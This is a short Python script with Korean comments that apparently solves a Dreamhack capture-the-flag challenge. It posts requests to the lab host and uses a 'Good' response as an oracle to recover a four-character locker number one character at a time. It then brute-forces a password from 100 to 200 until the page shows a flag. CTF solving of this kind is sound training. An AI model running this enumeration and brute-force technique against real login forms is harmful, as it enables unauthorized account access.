import string
import requests
import random

alphanumeric = string.ascii_lowercase + string.digits
host = "http://host8.dreamhack.games:13715/"
datas = {
    'locker_num':'',
    'password':''
}
locker_res = ''
password_res = ''
count = 0

while count < 4: #locker_num 구하기
    for i in range(len(alphanumeric)):
        print(i)
        datas['locker_num'] = locker_res + alphanumeric[i]

        req = requests.post(host, data=datas)
        if 'Good' in req.text:
            locker_res += alphanumeric[i]
            count += 1
            break

for i in range(100, 201): #password 구하기
    print(i)
    datas['locker_num'] = locker_res
    datas['password'] = str(i)

    req = requests.post(host, data=datas)

    if 'FLAG' in req.text :
        password_res = datas['password']
        break

print('locker_num = {0}, password = {1}'.format(locker_res, password_res)) # 결과출력